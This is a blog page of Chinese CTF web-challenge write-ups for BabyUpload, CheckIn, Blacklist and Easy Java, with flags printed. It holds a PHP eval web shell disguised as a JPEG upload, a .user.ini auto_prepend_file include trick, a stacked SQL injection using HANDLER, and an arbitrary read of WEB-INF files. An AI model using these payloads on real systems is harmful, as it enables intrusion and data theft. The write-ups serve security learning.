+<h2 id="gxyctf2019babyupload">[GXYCTF2019]BabyUpload<a hidden class="anchor" aria-hidden="true" href="#gxyctf2019babyupload">#</a></h2>
+<p>过滤ph后缀，先上传.htaccess，再上传shell.jpg即可，注意将一句话木马改为script标签：</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;uploaded&#34;; filename=&#34;shell.jpg&#34;
+Content-Type: image/jpeg
+
+&lt;script language=&#34;php&#34;&gt;@eval($_POST[&#34;shell&#34;]);&lt;/script&gt;
+</code></pre><p>flag{7a45bf74-6807-4299-9622-3604e7877b20}</p>
+<hr>
+<h2 id="suctf-2019checkin">[SUCTF 2019]CheckIn<a hidden class="anchor" aria-hidden="true" href="#suctf-2019checkin">#</a></h2>
+<p>.htaccess和php后缀全被过滤，还有对于图片头的检测，考虑上传.user.ini：</p>
+<pre tabindex="0"><code>GIF89a
+cgi.fix_pathinfo = 1
+engine = on
+auto_prepend_file=shell.jpg
+auto_append_file=shell.jpg
+</code></pre><p>在.user.ini同一目录下的任意php文件被解析时，都会在开头和结尾包含shell.jpg文件，蚁剑连接即可</p>
+<p>flag{bee6042e-5315-4127-a851-a4f06a8dd254}</p>
+<hr>
+<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist<a hidden class="anchor" aria-hidden="true" href="#gyctf2020blacklist">#</a></h2>
+<p>和强网杯的随便注感觉没区别，用handler代替select：</p>
+<pre tabindex="0"><code>1&#39;;handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` close #
+</code></pre><p>flag{6495833f-bb80-4b8b-858e-e7d99e474b89}</p>
+<hr>
+<h2 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java<a hidden class="anchor" aria-hidden="true" href="#roarctf-2019easy-java">#</a></h2>
+<p>第一道java题。点击help跳转到Download路由下，有一个任意文件读取，简单了解了一下java web项目的结构：</p>
+<pre tabindex="0"><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则
+/WEB-INF/classes/：包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件
+/WEB-INF/src/：源码目录，按照包名结构放置各个 Java 文件
+/WEB-INF/database.properties：数据库配置文件
+/WEB-INF/tags/：存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名
+/WEB-INF/jsp/：jsp 文件的存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition
+</code></pre><p>考虑读取web.xml文件，将请求方式改为POST：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;web-app</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">xsi:schemaLocation=</span><span style="color:#e6db74">&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;4.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;welcome-file-list&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;welcome-file&gt;</span>Index<span style="color:#f92672">&lt;/welcome-file&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/welcome-file-list&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>IndexController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.IndexController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>IndexController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Index<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>LoginController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.LoginController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>LoginController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Login<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>DownloadController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.DownloadController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>DownloadController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Download<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>FlagController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span style="color:#f92672">&lt;/servlet-class&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;servlet-name&gt;</span>FlagController<span style="color:#f92672">&lt;/servlet-name&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/Flag<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/servlet-mapping&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/web-app&gt;</span>
+</span></span></code></pre></div><p>直接访问/Flag路由会报错，直接读取/WEB-INF/classes/com.wm.ctf.FlagController.class文件，反编译：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> defpackage;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.ServletException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.annotation.WebServlet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServlet;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@WebServlet</span>(name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FlagController&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* renamed from: FlagController  reason: default package */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: _WEB-INF_classes_com_wm_ctf_FlagController.class */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FlagController</span> <span style="color:#66d9ef">extends</span> HttpServlet {
+</span></span><span style="display:flex;"><span>    String flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ZmxhZ3swN2MxZTVjNC1kNDI1LTQ0ODUtYTc5Ny0yYWNmMjVhODE0OGV9Cg==&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doGet</span>(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>        httpServletResponse.<span style="color:#a6e22e">getWriter</span>().<span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>base64解码得到flag：flag{07c1e5c4-d425-4485-a797-2acf25a8148e}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
